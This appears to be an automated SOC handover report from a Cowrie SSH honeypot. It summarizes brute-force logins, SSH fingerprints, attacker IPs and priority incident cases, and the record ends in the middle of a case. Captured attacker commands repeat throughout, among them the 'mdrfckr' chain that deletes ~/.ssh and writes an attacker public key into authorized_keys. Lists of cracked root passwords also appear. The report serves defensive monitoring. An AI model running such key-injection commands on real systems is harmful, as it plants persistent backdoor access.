# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T16:50:59Z |
| **Shift Time** | 16:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **82** |
| Confirmed Threats | **76** |
| False Positives Filtered | **6** (7.3%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **9** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **55** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **60** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **19** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 13 |
| `ubuntu` | 3 |
| `a` | 1 |
| `nil` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `password` | 2 |
| `a` | 1 |
| `` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `a` | `a` | 1 |
| `nil` | `` | 1 |
| `admin` | `admin` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `------fuck------` | `42.4.63.120` | 2026-04-25T15:27:27 |
| `root` | `qwe123456.` | `138.121.120.11` | 2026-04-25T15:38:31 |
| `root` | `3245gs5662d34` | `138.121.120.11` | 2026-04-25T15:38:38 |
| `root` | `Aa112211.` | `138.121.120.11` | 2026-04-25T15:41:42 |
| `root` | `root@@123` | `138.121.120.11` | 2026-04-25T15:44:50 |
| `root` | `root123$` | `138.121.120.11` | 2026-04-25T15:45:48 |
| `root` | `Ab123456789` | `138.121.120.11` | 2026-04-25T15:47:46 |
| `root` | `Qazwsx1111111!@#` | `138.121.120.11` | 2026-04-25T15:48:46 |
| `root` | `Aa@123456..` | `138.121.120.11` | 2026-04-25T15:52:51 |
| `root` | `1234Root` | `138.121.120.11` | 2026-04-25T15:54:49 |
| `root` | `nPSpP4PBW0` | `138.121.120.11` | 2026-04-25T15:55:49 |
| `root` | `Ma123456` | `138.121.120.11` | 2026-04-25T15:56:50 |
| `root` | `Qwe#$%` | `138.121.120.11` | 2026-04-25T15:57:50 |
| `root` | `root4321` | `43.130.90.166` | 2026-04-25T16:16:14 |
| `root` | `3245gs5662d34` | `43.130.90.166` | 2026-04-25T16:16:20 |
| `root` | `qQ@12345678` | `119.92.70.82` | 2026-04-25T16:22:22 |
| `root` | `3245gs5662d34` | `119.92.70.82` | 2026-04-25T16:22:25 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **82** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 62 |
| OpenSSH | 8 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 53 | 4 |
| `c118de82e19e...` | Mirai/variant | 8 | 1 |
| `03a80b21afa8...` | Modern SSH client | 5 | 3 |
| `f555226df196...` | Mirai/variant | 1 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 53 | 4 | libssh-based |
| `c118de82e19e...` | OpenSSH | 8 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 5 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `f555226df196...` | libssh | 1 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `119.92.70.82`, `138.121.120.11`, `43.130.90.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **15** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS29518` | Bredband2 AB | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | MEDIUM |
| `AS16629` | CTC. CORP S.A. (TELEFONICA EMPRESAS) | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS264293` | Smart Solucoes em Telecomunicacoes | 1 | HIGH |
| `AS208137` | Feo Prest SRL | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1944d57c355f

| Field | Detail |
|---|---|
| **Source IP** | `42.4.63[.]120` |
| **First Seen** | 2026-04-25 15:27 |
| **Last Seen** | 2026-04-25 15:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:27:26` | `cowrie.session.connect` |
| `2026-04-25 15:27:26` | `cowrie.client.version` |
| `2026-04-25 15:27:26` | `cowrie.client.kex` |
| `2026-04-25 15:27:27` | `cowrie.login.success` |
| `2026-04-25 15:27:27` | `cowrie.session.params` |
| `2026-04-25 15:27:27` | `cowrie.command.input` |
| `2026-04-25 15:27:27` | `cowrie.log.closed` |
| `2026-04-25 15:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.4.63[.]120` to AbuseIPDB if not already reported
- [ ] Block `42.4.63[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49b5cedba9e2

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:38 |
| **Last Seen** | 2026-04-25 15:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:38:29` | `cowrie.session.connect` |
| `2026-04-25 15:38:29` | `cowrie.client.version` |
| `2026-04-25 15:38:29` | `cowrie.client.kex` |
| `2026-04-25 15:38:31` | `cowrie.login.success` |
| `2026-04-25 15:38:31` | `cowrie.session.params` |
| `2026-04-25 15:38:31` | `cowrie.command.input` |
| `2026-04-25 15:38:31` | `cowrie.command.failed` |
| `2026-04-25 15:38:32` | `cowrie.log.closed` |
| `2026-04-25 15:38:33` | `cowrie.session.params` |
| `2026-04-25 15:38:33` | `cowrie.command.input` |
| `2026-04-25 15:38:33` | `cowrie.session.file_download` |
| `2026-04-25 15:38:33` | `cowrie.log.closed` |
| `2026-04-25 15:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8431100c16eb

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:38 |
| **Last Seen** | 2026-04-25 15:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:38:37` | `cowrie.session.connect` |
| `2026-04-25 15:38:37` | `cowrie.client.version` |
| `2026-04-25 15:38:37` | `cowrie.client.kex` |
| `2026-04-25 15:38:38` | `cowrie.login.success` |
| `2026-04-25 15:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d45ba778d73

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:41 |
| **Last Seen** | 2026-04-25 15:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:41:40` | `cowrie.session.connect` |
| `2026-04-25 15:41:40` | `cowrie.client.version` |
| `2026-04-25 15:41:41` | `cowrie.client.kex` |
| `2026-04-25 15:41:42` | `cowrie.login.success` |
| `2026-04-25 15:41:43` | `cowrie.session.params` |
| `2026-04-25 15:41:43` | `cowrie.command.input` |
| `2026-04-25 15:41:43` | `cowrie.command.failed` |
| `2026-04-25 15:41:43` | `cowrie.log.closed` |
| `2026-04-25 15:41:44` | `cowrie.session.params` |
| `2026-04-25 15:41:44` | `cowrie.command.input` |
| `2026-04-25 15:41:44` | `cowrie.session.file_download` |
| `2026-04-25 15:41:44` | `cowrie.log.closed` |
| `2026-04-25 15:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b359d718587

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:41 |
| **Last Seen** | 2026-04-25 15:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:41:48` | `cowrie.session.connect` |
| `2026-04-25 15:41:48` | `cowrie.client.version` |
| `2026-04-25 15:41:48` | `cowrie.client.kex` |
| `2026-04-25 15:41:50` | `cowrie.login.success` |
| `2026-04-25 15:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e6cff8268b

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:44 |
| **Last Seen** | 2026-04-25 15:44 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:44:46` | `cowrie.session.connect` |
| `2026-04-25 15:44:46` | `cowrie.client.version` |
| `2026-04-25 15:44:48` | `cowrie.client.kex` |
| `2026-04-25 15:44:50` | `cowrie.login.success` |
| `2026-04-25 15:44:50` | `cowrie.session.params` |
| `2026-04-25 15:44:50` | `cowrie.command.input` |
| `2026-04-25 15:44:50` | `cowrie.command.failed` |
| `2026-04-25 15:44:51` | `cowrie.log.closed` |
| `2026-04-25 15:44:52` | `cowrie.session.params` |
| `2026-04-25 15:44:52` | `cowrie.command.input` |
| `2026-04-25 15:44:53` | `cowrie.session.file_download` |
| `2026-04-25 15:44:53` | `cowrie.log.closed` |
| `2026-04-25 15:44:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73f3d4571d23

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:44 |
| **Last Seen** | 2026-04-25 15:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:44:56` | `cowrie.session.connect` |
| `2026-04-25 15:44:56` | `cowrie.client.version` |
| `2026-04-25 15:44:57` | `cowrie.client.kex` |
| `2026-04-25 15:44:58` | `cowrie.login.success` |
| `2026-04-25 15:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade90c45d6a5

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:45 |
| **Last Seen** | 2026-04-25 15:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:45:47` | `cowrie.session.connect` |
| `2026-04-25 15:45:47` | `cowrie.client.version` |
| `2026-04-25 15:45:47` | `cowrie.client.kex` |
| `2026-04-25 15:45:48` | `cowrie.login.success` |
| `2026-04-25 15:45:49` | `cowrie.session.params` |
| `2026-04-25 15:45:49` | `cowrie.command.input` |
| `2026-04-25 15:45:49` | `cowrie.command.failed` |
| `2026-04-25 15:45:50` | `cowrie.log.closed` |
| `2026-04-25 15:45:50` | `cowrie.session.params` |
| `2026-04-25 15:45:50` | `cowrie.command.input` |
| `2026-04-25 15:45:51` | `cowrie.session.file_download` |
| `2026-04-25 15:45:51` | `cowrie.log.closed` |
| `2026-04-25 15:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cdaaa7ed556

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:45 |
| **Last Seen** | 2026-04-25 15:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:45:54` | `cowrie.session.connect` |
| `2026-04-25 15:45:54` | `cowrie.client.version` |
| `2026-04-25 15:45:55` | `cowrie.client.kex` |
| `2026-04-25 15:45:56` | `cowrie.login.success` |
| `2026-04-25 15:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c20216ee5a63

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:47 |
| **Last Seen** | 2026-04-25 15:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:47:44` | `cowrie.session.connect` |
| `2026-04-25 15:47:44` | `cowrie.client.version` |
| `2026-04-25 15:47:45` | `cowrie.client.kex` |
| `2026-04-25 15:47:46` | `cowrie.login.success` |
| `2026-04-25 15:47:47` | `cowrie.session.params` |
| `2026-04-25 15:47:47` | `cowrie.command.input` |
| `2026-04-25 15:47:47` | `cowrie.command.failed` |
| `2026-04-25 15:47:47` | `cowrie.log.closed` |
| `2026-04-25 15:47:48` | `cowrie.session.params` |
| `2026-04-25 15:47:48` | `cowrie.command.input` |
| `2026-04-25 15:47:48` | `cowrie.session.file_download` |
| `2026-04-25 15:47:48` | `cowrie.log.closed` |
| `2026-04-25 15:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8985b8ba1d8

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:47 |
| **Last Seen** | 2026-04-25 15:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:47:52` | `cowrie.session.connect` |
| `2026-04-25 15:47:52` | `cowrie.client.version` |
| `2026-04-25 15:47:52` | `cowrie.client.kex` |
| `2026-04-25 15:47:54` | `cowrie.login.success` |
| `2026-04-25 15:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60aa5b88ab96

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:48 |
| **Last Seen** | 2026-04-25 15:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:48:44` | `cowrie.session.connect` |
| `2026-04-25 15:48:44` | `cowrie.client.version` |
| `2026-04-25 15:48:45` | `cowrie.client.kex` |
| `2026-04-25 15:48:46` | `cowrie.login.success` |
| `2026-04-25 15:48:47` | `cowrie.session.params` |
| `2026-04-25 15:48:47` | `cowrie.command.input` |
| `2026-04-25 15:48:47` | `cowrie.command.failed` |
| `2026-04-25 15:48:47` | `cowrie.log.closed` |
| `2026-04-25 15:48:48` | `cowrie.session.params` |
| `2026-04-25 15:48:48` | `cowrie.command.input` |
| `2026-04-25 15:48:48` | `cowrie.session.file_download` |
| `2026-04-25 15:48:48` | `cowrie.log.closed` |
| `2026-04-25 15:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9408177720de

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:48 |
| **Last Seen** | 2026-04-25 15:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:48:52` | `cowrie.session.connect` |
| `2026-04-25 15:48:52` | `cowrie.client.version` |
| `2026-04-25 15:48:52` | `cowrie.client.kex` |
| `2026-04-25 15:48:54` | `cowrie.login.success` |
| `2026-04-25 15:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90b61f5c1fc4

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:52 |
| **Last Seen** | 2026-04-25 15:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
